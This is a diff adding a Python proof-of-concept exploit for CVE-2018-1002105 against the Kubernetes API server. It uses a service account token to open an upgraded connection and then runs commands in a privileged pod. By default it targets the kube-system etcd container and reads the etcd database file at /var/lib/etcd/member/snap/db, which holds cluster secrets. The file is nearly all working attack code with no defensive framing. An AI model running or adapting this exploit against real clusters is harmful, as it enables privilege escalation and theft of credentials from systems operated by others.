@@ -1,0 +1,132 @@
+#!/usr/bin/env python3
+import argparse
+from ssl import wrap_socket
+from socket import create_connection
+from secrets import base64, token_bytes
+
+
+def request_stage_1(namespace, pod, method, target, token):
+
+    stage_1 = ""
+
+    with open('stage_1', 'r') as stage_1_fd:
+        stage_1 = stage_1_fd.read()
+
+    return stage_1.format(namespace, pod, method, target,
+                          token).encode('utf-8')
+
+
+def request_stage_2(target, namespace, pod, container, command):
+
+    stage_2 = ""
+
+    command = f"command={'&command='.join(command.split(' '))}"
+
+    with open('stage_2', 'r') as stage_2_fd:
+        stage_2 = stage_2_fd.read()
+
+    key = base64.b64encode(token_bytes(20)).decode('utf-8')
+
+    return stage_2.format(namespace, pod, container, command,
+                          target, key).encode('utf-8')
+
+
+def run_exploit(target, stage_1, stage_2, method, filename, ppod,
+                container):
+
+    host, port = target.split(':')
+
+    with create_connection((host, port)) as sock:
+
+        with wrap_socket(sock) as ssock:
+            print(f"[*] Building pipe using {method}...")
+            ssock.send(stage_1)
+
+            if b'400 Bad Request' in ssock.recv(4096):
+                print('[+] Pipe opened :D')
+
+            else:
+                print('[-] Not sure if this went well...')
+
+            print(f"[*] Attempting code exec on {ppod}/{container}")
+            ssock.send(stage_2)
+
+            if b'HTTP/1.1 101 Switching Protocols' not in ssock.recv(4096):
+                print('[-] Exploit failed :(')
+
+                return False
+
+            data_incoming = True
+
+            data = []
+
+            while data_incoming:
+                data_in = ssock.recv(4096)
+                data.append(data_in)
+
+                if not data_in:
+                    data_incoming = False
+
+            if filename:
+                print(f"[*] Writing output to {filename} ....")
+
+                with open(filename, 'wb+') as fd:
+                    for msg in data:
+                        fd.write(msg)
+
+                    print('[+] Done!')
+
+            else:
+                print(''.join(msg.decode('unicode-escape')
+                              for msg in data))
+
+
+def main():
+
+    parser = argparse.ArgumentParser(description='PoC for CVE-2018-1002105.')
+
+    required = parser.add_argument_group('required arguments')
+    optional = parser.add_argument_group('optional arguments')
+
+    required.add_argument('--target', '-t', dest='target', type=str,
+                          help='API server target:port', required=True)
+    required.add_argument('--jwt', '-j', dest='token', type=str,
+                          help='JWT token for service account', required=True)
+    required.add_argument('--namespace', '-n', dest='namespace', type=str,
+                          help='Namespace with method access',
+                          default='default')
+    required.add_argument('--pod', '-p', dest='pod', type=str,
+                          required=True, help='Pod with method access')
+    required.add_argument('--method', '-m', dest='method', choices=['exec',
+                          'portforward', 'attach'], required=True)
+
+    optional.add_argument('--privileged-namespace', '-s', dest='pnamespace',
+                          help='Target namespace', default='kube-system')
+    optional.add_argument('--privileged-pod', '-e', dest='ppod', type=str,
+                          help='Target privileged pod',
+                          default='etcd-kubernetes')
+    optional.add_argument('--container', '-c', dest='container', type=str,
+                          help='Target container', default='etcd')
+    optional.add_argument('--command', '-x', dest='command', type=str,
+                          help='Command to execute',
+                          default='/bin/cat /var/lib/etcd/member/snap/db')
+    optional.add_argument('--filename', '-f', dest='filename', type=str,
+                          help='File to save output to', default=False)
+
+    args = parser.parse_args()
+
+    if args.target.find(':') == -1:
+        print(f"[-] invalid target {args.target}")
+        return False
+
+    stage1 = request_stage_1(args.namespace, args.pod, args.method, args.target,
+                             args.token)
+    stage2 = request_stage_2(args.target, args.pnamespace, args.ppod,
+                             args.container, args.command)
+
+    run_exploit(args.target, stage1, stage2, args.method, args.filename,
+                args.ppod, args.container)
+
+
+if __name__ == '__main__':
+    main()
